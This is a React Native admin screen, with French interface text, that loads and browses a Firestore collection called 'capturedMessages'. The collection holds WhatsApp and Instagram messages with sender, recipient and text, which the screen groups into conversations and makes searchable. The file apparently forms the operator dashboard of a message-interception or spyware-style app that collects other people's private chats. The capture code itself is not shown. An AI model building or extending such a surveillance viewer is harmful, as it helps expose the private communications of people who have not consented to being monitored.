import React, { useState, useEffect, useMemo } from 'react';
import {
  View,
  Text,
  StyleSheet,
  FlatList,
  TouchableOpacity,
  TextInput,
  ActivityIndicator,
  RefreshControl,
  ScrollView,
} from 'react-native';
import firestore from '@react-native-firebase/firestore';
import { Typography } from '../constants/Typography';
import { CurrentTheme } from '../constants/Themes';
import LinearGradient from 'react-native-linear-gradient';

interface Message {
  id: string;
  appName?: string;
  sender?: string;
  recipient?: string;
  text?: string;
  timestamp?: any;
  messageType?: string;
  isSent?: boolean;
}

interface Conversation {
  key: string;
  contact: string;
  app: string;
  messages: Message[];
  lastMessage: Date;
  totalSent: number;
  totalReceived: number;
}

export const AdminMessagesScreen: React.FC = () => {
  const [messages, setMessages] = useState<Message[]>([]);
  const [loading, setLoading] = useState(true);
  const [refreshing, setRefreshing] = useState(false);
  const [filter, setFilter] = useState<'all' | 'whatsapp' | 'instagram'>('all');
  const [search, setSearch] = useState('');
  const [viewMode, setViewMode] = useState<'conversations' | 'list'>('conversations');
  const [selectedConversation, setSelectedConversation] = useState<string | null>(null);

  // Load messages from Firestore
  const loadMessages = async () => {
    try {
      let query = firestore()
        .collection('capturedMessages')
        .orderBy('timestamp', 'desc')
        .limit(200);

      if (filter !== 'all') {
        const appName = filter === 'whatsapp' ? 'WhatsApp' : 'Instagram';
        query = firestore()
          .collection('capturedMessages')
          .where('appName', '==', appName)
          .orderBy('timestamp', 'desc')
          .limit(200);
      }

      const snapshot = await query.get();
      const messagesData = snapshot.docs.map(doc => ({
        id: doc.id,
        ...doc.data()
      })) as Message[];

      setMessages(messagesData);
    } catch (error) {
      console.error('Error loading messages:', error);
    } finally {
      setLoading(false);
      setRefreshing(false);
    }
  };

  useEffect(() => {
    loadMessages();
  }, [filter]);

  const onRefresh = () => {
    setRefreshing(true);
    loadMessages();
  };

  // Group messages by conversation
  const conversations = useMemo(() => {
    const convMap = new Map<string, Conversation>();

    messages.forEach((msg: Message) => {
      const isSent = msg.isSent || msg.messageType === 'sent';
      const contact = isSent ? (msg.recipient || 'Unknown') : (msg.sender || 'Unknown');

      if (contact === 'Me' || contact === 'Unknown') return;

      const app = msg.appName || 'Unknown';
      const key = `${contact}-${app}`;

      if (!convMap.has(key)) {
        convMap.set(key, {
          key,
          contact,
          app,
          messages: [],
          lastMessage: msg.timestamp?.toDate?.() || new Date(),
          totalSent: 0,
          totalReceived: 0
        });
      }

      const conv = convMap.get(key)!;
      conv.messages.push(msg);

      if (isSent) {
        conv.totalSent++;
      } else {
        conv.totalReceived++;
      }
    });

    return Array.from(convMap.values())
      .map(conv => ({
        ...conv,
        messages: conv.messages.sort((a, b) => {
          const timeA = a.timestamp?.toDate?.()?.getTime() || 0;
          const timeB = b.timestamp?.toDate?.()?.getTime() || 0;
          return timeA - timeB;
        })
      }))
      .sort((a, b) => b.lastMessage.getTime() - a.lastMessage.getTime());
  }, [messages]);

  // Filter conversations by search
  const filteredConversations = useMemo(() => {
    if (!search) return conversations;
    const searchLower = search.toLowerCase();
    return conversations.filter(conv =>
      conv.contact.toLowerCase().includes(searchLower) ||
      conv.messages.some(msg => msg.text?.toLowerCase().includes(searchLower))
    );
  }, [conversations, search]);

  // Filter messages by search (for list view)
  const filteredMessages = useMemo(() => {
    if (!search) return messages;
    const searchLower = search.toLowerCase();
    return messages.filter(msg =>
      msg.sender?.toLowerCase().includes(searchLower) ||
      msg.recipient?.toLowerCase().includes(searchLower) ||
      msg.text?.toLowerCase().includes(searchLower)
    );
  }, [messages, search]);

  // Format time
  const formatTime = (date: Date) => {
    const now = new Date();
    const diff = now.getTime() - date.getTime();
    const minutes = Math.floor(diff / 60000);
    const hours = Math.floor(diff / 3600000);
    const days = Math.floor(diff / 86400000);

    if (minutes < 1) return 'À l\'instant';
    if (minutes < 60) return `Il y a ${minutes}min`;
    if (hours < 24) return `Il y a ${hours}h`;
    if (days < 7) return `Il y a ${days}j`;
    return date.toLocaleDateString('fr-FR');
  };

  const renderConversationItem = ({ item }: { item: Conversation }) => (
    <TouchableOpacity
      style={styles.conversationCard}
      onPress={() => setSelectedConversation(item.key)}
    >
      <View style={styles.conversationHeader}>
        <View style={styles.conversationInfo}>
          <Text style={styles.conversationContact}>{item.contact}</Text>
          <Text style={styles.conversationApp}>{item.app}</Text>
        </View>
        <Text style={styles.conversationTime}>
          {formatTime(item.lastMessage)}
        </Text>
      </View>
      <Text style={styles.conversationPreview} numberOfLines={1}>
        {item.messages[item.messages.length - 1]?.text || 'Pas de message'}
      </Text>
      <View style={styles.conversationStats}>
        <Text style={styles.statText}>📤 {item.totalSent} envoyés</Text>
        <Text style={styles.statText}>📥 {item.totalReceived} reçus</Text>
      </View>
    </TouchableOpacity>
  );

  const renderMessageItem = ({ item }: { item: Message }) => {
    const isSent = item.isSent || item.messageType === 'sent';
    return (
      <View style={[
        styles.messageCard,
        isSent ? styles.sentMessage : styles.receivedMessage
      ]}>
        <View style={styles.messageHeader}>
          <Text style={styles.messageApp}>{item.appName}</Text>
          <Text style={styles.messageTime}>
            {item.timestamp?.toDate?.() ? formatTime(item.timestamp.toDate()) : 'N/A'}
          </Text>
        </View>
        <Text style={styles.messageContact}>
          {isSent ? `À: ${item.recipient}` : `De: ${item.sender}`}
        </Text>
        <Text style={styles.messageText}>{item.text}</Text>
      </View>
    );
  };

  // Render selected conversation detail
  if (selectedConversation) {
    const conversation = conversations.find(c => c.key === selectedConversation);
    if (!conversation) return null;

    return (
      <View style={styles.container}>
        <LinearGradient
          colors={['#1F2937', '#111827']}
          style={styles.header}
        >
          <TouchableOpacity
            style={styles.backButton}
            onPress={() => setSelectedConversation(null)}
          >
            <Text style={styles.backButtonText}>← Retour</Text>
          </TouchableOpacity>
          <Text style={styles.headerTitle}>{conversation.contact}</Text>
          <Text style={styles.headerSubtitle}>{conversation.app}</Text>
        </LinearGradient>

        <FlatList
          data={conversation.messages}
          renderItem={renderMessageItem}
          keyExtractor={item => item.id}
          contentContainerStyle={styles.messagesList}
          refreshControl={
            <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
          }
        />
      </View>
    );
  }

  return (
    <View style={styles.container}>
      <LinearGradient
        colors={['#1F2937', '#111827']}
        style={styles.header}
      >
        <Text style={styles.headerTitle}>Messages Admin</Text>
        {loading ? (
          <Text style={styles.loadingBadge}>⏳ Chargement...</Text>
        ) : (
          <Text style={styles.successBadge}>
            ✓ {messages.length} messages chargés
          </Text>
        )}
      </LinearGradient>

      {/* Filters */}
      <View style={styles.filtersContainer}>
        <ScrollView horizontal showsHorizontalScrollIndicator={false}>
          <TouchableOpacity
            style={[styles.filterButton, filter === 'all' && styles.filterButtonActive]}
            onPress={() => setFilter('all')}
          >
            <Text style={[styles.filterText, filter === 'all' && styles.filterTextActive]}>
              Tous
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={[styles.filterButton, filter === 'whatsapp' && styles.filterButtonActive]}
            onPress={() => setFilter('whatsapp')}
          >
            <Text style={[styles.filterText, filter === 'whatsapp' && styles.filterTextActive]}>
              WhatsApp
            </Text>
          </TouchableOpacity>
          <TouchableOpacity
            style={[styles.filterButton, filter === 'instagram' && styles.filterButtonActive]}
            onPress={() => setFilter('instagram')}
          >
            <Text style={[styles.filterText, filter === 'instagram' && styles.filterTextActive]}>
              Instagram
            </Text>
          </TouchableOpacity>
        </ScrollView>
      </View>

      {/* Search */}
      <View style={styles.searchContainer}>
        <TextInput
          style={styles.searchInput}
          placeholder="Rechercher..."
          placeholderTextColor="#9CA3AF"
          value={search}
          onChangeText={setSearch}
        />
      </View>

      {/* View Mode Toggle */}
      <View style={styles.viewModeContainer}>
        <TouchableOpacity
          style={[
            styles.viewModeButton,
            viewMode === 'conversations' && styles.viewModeButtonActive
          ]}
          onPress={() => setViewMode('conversations')}
        >
          <Text style={[
            styles.viewModeText,
            viewMode === 'conversations' && styles.viewModeTextActive
          ]}>
            💬 Conversations
          </Text>
        </TouchableOpacity>
        <TouchableOpacity
          style={[
            styles.viewModeButton,
            viewMode === 'list' && styles.viewModeButtonActive
          ]}
          onPress={() => setViewMode('list')}
        >
          <Text style={[
            styles.viewModeText,
            viewMode === 'list' && styles.viewModeTextActive
          ]}>
            📋 Liste
          </Text>
        </TouchableOpacity>
      </View>

      {/* Content */}
      {loading ? (
        <View style={styles.loadingContainer}>
          <ActivityIndicator size="large" color="#3B82F6" />
          <Text style={styles.loadingText}>Chargement des messages...</Text>
        </View>
      ) : (
        <FlatList
          data={viewMode === 'conversations' ? filteredConversations : filteredMessages}
          renderItem={viewMode === 'conversations' ? renderConversationItem : renderMessageItem}
          keyExtractor={item => viewMode === 'conversations' ? (item as Conversation).key : (item as Message).id}
          contentContainerStyle={styles.listContainer}
          refreshControl={
            <RefreshControl refreshing={refreshing} onRefresh={onRefresh} />
          }
          ListEmptyComponent={
            <View style={styles.emptyContainer}>
              <Text style={styles.emptyText}>Aucun message trouvé</Text>
            </View>
          }
        />
      )}
    </View>
  );
};

const styles = StyleSheet.create({
  container: {
    flex: 1,
    backgroundColor: '#0F1419',
  },
  header: {
    paddingTop: 60,
    paddingBottom: 20,
    paddingHorizontal: 20,
    borderBottomWidth: 1,
    borderBottomColor: '#374151',
  },
  headerTitle: {
    ...Typography.h1,
    color: '#FFFFFF',
    marginBottom: 8,
  },
  headerSubtitle: {
    ...Typography.body,
    color: '#9CA3AF',
    marginTop: 4,
  },
  loadingBadge: {
    ...Typography.caption,
    color: '#3B82F6',
    backgroundColor: '#1E3A8A20',
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 20,
    alignSelf: 'flex-start',
  },
  successBadge: {
    ...Typography.caption,
    color: '#10B981',
    backgroundColor: '#05402920',
    paddingHorizontal: 12,
    paddingVertical: 6,
    borderRadius: 20,
    alignSelf: 'flex-start',
  },
  backButton: {
    marginBottom: 12,
  },
  backButtonText: {
    ...Typography.body,
    color: '#3B82F6',
  },
  filtersContainer: {
    paddingVertical: 12,
    paddingHorizontal: 20,
    borderBottomWidth: 1,
    borderBottomColor: '#374151',
  },
  filterButton: {
    paddingHorizontal: 16,
    paddingVertical: 8,
    marginRight: 8,
    borderRadius: 20,
    backgroundColor: '#1F2937',
    borderWidth: 1,
    borderColor: '#374151',
  },
  filterButtonActive: {
    backgroundColor: '#3B82F6',
    borderColor: '#3B82F6',
  },
  filterText: {
    ...Typography.body,
    color: '#9CA3AF',
  },
  filterTextActive: {
    color: '#FFFFFF',
  },
  searchContainer: {
    paddingHorizontal: 20,
    paddingVertical: 12,
    borderBottomWidth: 1,
    borderBottomColor: '#374151',
  },
  searchInput: {
    backgroundColor: '#1F2937',
    borderRadius: 12,
    paddingHorizontal: 16,
    paddingVertical: 12,
    color: '#FFFFFF',
    ...Typography.body,
  },
  viewModeContainer: {
    flexDirection: 'row',
    paddingHorizontal: 20,
    paddingVertical: 12,
    borderBottomWidth: 1,
    borderBottomColor: '#374151',
  },
  viewModeButton: {
    flex: 1,
    paddingVertical: 10,
    marginHorizontal: 4,
    borderRadius: 8,
    backgroundColor: '#1F2937',
    alignItems: 'center',
  },
  viewModeButtonActive: {
    backgroundColor: '#3B82F6',
  },
  viewModeText: {
    ...Typography.body,
    color: '#9CA3AF',
  },
  viewModeTextActive: {
    color: '#FFFFFF',
  },
  loadingContainer: {
    flex: 1,
    justifyContent: 'center',
    alignItems: 'center',
  },
  loadingText: {
    ...Typography.body,
    color: '#9CA3AF',
    marginTop: 16,
  },
  listContainer: {
    padding: 20,
  },
  conversationCard: {
    backgroundColor: '#1F2937',
    borderRadius: 12,
    padding: 16,
    marginBottom: 12,
    borderWidth: 1,
    borderColor: '#374151',
  },
  conversationHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'flex-start',
    marginBottom: 8,
  },
  conversationInfo: {
    flex: 1,
  },
  conversationContact: {
    ...Typography.h3,
    color: '#FFFFFF',
    marginBottom: 4,
  },
  conversationApp: {
    ...Typography.caption,
    color: '#3B82F6',
  },
  conversationTime: {
    ...Typography.caption,
    color: '#9CA3AF',
  },
  conversationPreview: {
    ...Typography.body,
    color: '#9CA3AF',
    marginBottom: 12,
  },
  conversationStats: {
    flexDirection: 'row',
    justifyContent: 'space-around',
    paddingTop: 12,
    borderTopWidth: 1,
    borderTopColor: '#374151',
  },
  statText: {
    ...Typography.caption,
    color: '#9CA3AF',
  },
  messageCard: {
    backgroundColor: '#1F2937',
    borderRadius: 12,
    padding: 16,
    marginBottom: 12,
    borderWidth: 1,
    borderColor: '#374151',
  },
  sentMessage: {
    borderLeftWidth: 4,
    borderLeftColor: '#10B981',
  },
  receivedMessage: {
    borderLeftWidth: 4,
    borderLeftColor: '#3B82F6',
  },
  messageHeader: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    marginBottom: 8,
  },
  messageApp: {
    ...Typography.caption,
    color: '#3B82F6',
    fontWeight: '600',
  },
  messageTime: {
    ...Typography.caption,
    color: '#9CA3AF',
  },
  messageContact: {
    ...Typography.caption,
    color: '#9CA3AF',
    marginBottom: 8,
  },
  messageText: {
    ...Typography.body,
    color: '#FFFFFF',
  },
  messagesList: {
    padding: 20,
  },
  emptyContainer: {
    padding: 40,
    alignItems: 'center',
  },
  emptyText: {
    ...Typography.body,
    color: '#9CA3AF',
  },
});

export default AdminMessagesScreen;
